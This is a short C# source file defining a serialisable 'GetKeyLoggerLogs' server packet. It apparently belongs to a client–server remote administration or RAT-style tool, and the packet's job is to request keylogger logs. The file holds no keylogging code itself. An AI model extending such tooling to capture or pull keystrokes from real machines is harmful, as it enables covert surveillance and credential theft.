﻿using Client.Controllers;
using ZeroFormatter;

namespace Client.Packets.ServerPackets
{
    [ZeroFormattable]
    public class GetKeyLoggerLogs : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetKeyLoggerLogs;
            }
        }

        public void Execute(ClientMosaique client)
        {
            client.send(this);
        }
    }
}
